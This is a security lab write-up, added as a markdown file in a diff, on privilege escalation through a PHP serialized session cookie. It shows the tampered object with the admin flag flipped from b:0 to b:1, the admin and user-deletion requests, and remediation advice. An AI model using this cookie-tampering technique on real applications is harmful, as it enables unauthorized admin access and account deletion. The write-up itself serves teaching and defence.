@@ -1,0 +1,355 @@
+# PHP Insecure Deserialization - Privilege Escalation via Client-Side Serialized Session Cookie
+
+---
+
+# Executive Summary
+
+A privilege escalation vulnerability was identified in the application's session management mechanism. The application stored user authorization data inside a client-side PHP serialized object without any integrity protection (such as an HMAC or digital signature).
+
+By modifying the serialized object's `admin` attribute from `false` to `true`, it was possible to obtain administrator privileges and access restricted functionality, including the ability to delete arbitrary user accounts.
+
+---
+
+# Vulnerability Classification
+
+| Field | Value |
+|--------|-------|
+| **Vulnerability** | PHP Insecure Deserialization |
+| **CWE** | CWE-502 - Deserialization of Untrusted Data |
+| **OWASP Top 10** | A01:2021 - Broken Access Control |
+| **Severity** | High |
+| **CVSS v3.1 (Estimated)** | 8.8 (High) |
+| **Impact** | Privilege Escalation |
+
+---
+
+# Affected Endpoints
+
+```http
+GET /my-account
+```
+
+```http
+GET /admin
+```
+
+```http
+GET /admin/delete?username=carlos
+```
+
+---
+
+# Description
+
+The application stores authenticated user information inside a **serialized PHP object** contained in the `session` cookie.
+
+The cookie includes an authorization property named `admin`.
+
+Because the application deserializes the object received from the client **without validating its integrity**, an attacker can modify the authorization flag and gain administrator privileges.
+
+---
+
+# Root Cause
+
+The server stores authorization data on the client side instead of maintaining it server side.
+
+Furthermore, the serialized object is:
+
+- Not digitally signed
+- Not protected with an HMAC
+- Not encrypted
+
+As a result, any authenticated user can modify the serialized object before sending it back to the server.
+
+---
+
+# Methodology
+
+## Step 1 - Authenticate
+
+Log into the application using the credentials provided by the lab.
+
+After authentication, navigate to:
+
+```http
+GET /my-account
+```
+
+Intercept the request using Burp Suite.
+
+---
+
+## Step 2 - Inspect the Session Cookie
+
+Open the request in **Burp Repeater**.
+
+Using **Inspector**, decode the `session` cookie.
+
+Burp automatically performs:
+
+- URL Decoding
+- Base64 Decoding
+- PHP Object Deserialization
+
+The decoded object appears as follows:
+
+```php
+O:4:"User":2:{
+    s:8:"username";
+    s:6:"wiener";
+    s:5:"admin";
+    b:0;
+}
+```
+
+The value:
+
+```php
+b:0;
+```
+
+indicates that the current user is **not** an administrator.
+
+---
+
+## Step 3 - Modify the Serialized Object
+
+Change only the boolean value:
+
+```php
+b:0;
+```
+
+to
+
+```php
+b:1;
+```
+
+The resulting object becomes:
+
+```php
+O:4:"User":2:{
+    s:8:"username";
+    s:6:"wiener";
+    s:5:"admin";
+    b:1;
+}
+```
+
+After clicking **Apply Changes**, Burp automatically:
+
+- Serializes the PHP object
+- Base64 encodes it
+- URL encodes it
+- Updates the cookie value
+
+---
+
+## Step 4 - Replay the Request
+
+Send the modified request.
+
+The response now contains a link to:
+
+```http
+/admin
+```
+
+confirming that administrator privileges have been granted.
+
+---
+
+## Step 5 - Access the Administration Panel
+
+Modify the request path:
+
+```http
+GET /my-account
+```
+
+↓
+
+```http
+GET /admin
+```
+
+The administration interface becomes accessible.
+
+---
+
+## Step 6 - Delete the Target User
+
+Locate the delete action inside the administration panel.
+
+Send:
+
+```http
+GET /admin/delete?username=carlos
+```
+
+The target account is successfully deleted, solving the lab.
+
+---
+
+# HTTP Requests
+
+## Original Request
+
+```http
+GET /my-account HTTP/2
+
+Cookie:
+session=<Serialized PHP Object (admin=false)>
+```
+
+---
+
+## Modified Serialized Object
+
+```php
+O:4:"User":2:{
+    s:8:"username";
+    s:6:"wiener";
+    s:5:"admin";
+    b:1;
+}
+```
+
+---
+
+## Administrator Request
+
+```http
+GET /admin HTTP/2
+```
+
+---
+
+## Delete User Request
+
+```http
+GET /admin/delete?username=carlos HTTP/2
+```
+
+---
+
+# Proof of Concept
+
+1. Authenticate as a normal user.
+2. Intercept the request to `/my-account`.
+3. Decode the `session` cookie.
+4. Modify:
+
+```php
+admin => false
+```
+
+to
+
+```php
+admin => true
+```
+
+5. Replay the request.
+6. Observe the administrator panel.
+7. Access `/admin`.
+8. Delete the target user.
+
+---
+
+# Why the Exploit Worked
+
+The vulnerability exists because the application **trusts client-controlled authorization data**.
+
+Instead of storing the user's role on the server, it stores the following PHP object inside a cookie:
+
+```php
+O:4:"User":2:{
+    s:8:"username";
+    s:6:"wiener";
+    s:5:"admin";
+    b:0;
+}
+```
+
+Each time the browser sends the cookie back, the server performs the following operations:
+
+1. Reads the cookie.
+2. Base64 decodes it.
+3. Unserializes the PHP object.
+4. Uses the `admin` property to determine whether the user is an administrator.
+
+Since the cookie is **not signed**, **not encrypted**, and **not integrity protected**, an attacker can simply modify:
+
+```php
+b:0;
+```
+
+to
+
+```php
+b:1;
+```
+
+When the server deserializes the modified object, it effectively executes logic equivalent to:
+
+```php
+$user->admin = true;
+```
+
+The authorization check therefore becomes:
+
+```php
+if ($user->admin) {
+    // Allow administrator access
+}
+```
+
+Because the application blindly trusts the client-controlled object, the condition evaluates to `true`, granting full administrator privileges.
+
+---
+
+# Impact
+
+Successful exploitation allows an authenticated attacker to:
+
+- Escalate privileges to Administrator.
+- Access restricted administrative functionality.
+- Delete arbitrary user accounts.
+- Perform any administrative action exposed by the application.
+- Fully compromise the application's authorization model.
+
+---
+
+# Remediation
+
+## Critical
+
+Never store authorization decisions inside client-controlled serialized objects.
+
+## Recommended
+
+- Store session state server-side.
+- Use opaque session identifiers.
+- Protect cookies using an HMAC.
+- Encrypt sensitive client-side data where appropriate.
+- Perform authorization checks exclusively on server-side data.
+- Avoid PHP serialization for untrusted input whenever possible.
+
+---
+
+# References
+
+- CWE-502 — Deserialization of Untrusted Data
+- OWASP Top 10 2021 – A01: Broken Access Control
+- OWASP Deserialization Cheat Sheet
+- PHP Manual – serialize() / unserialize()
+
+---
+
+# Conclusion
+
+The application trusted a client-controlled serialized PHP object to determine user privileges. Because the session cookie lacked integrity protection, modifying a single boolean value (`admin`) from `false` to `true` resulted in full administrative access.
+
+This vulnerability demonstrates a classic case of **Insecure Deserialization** combined with **Broken Access Control**, where sensitive authorization decisions are delegated to data fully controlled by the client.
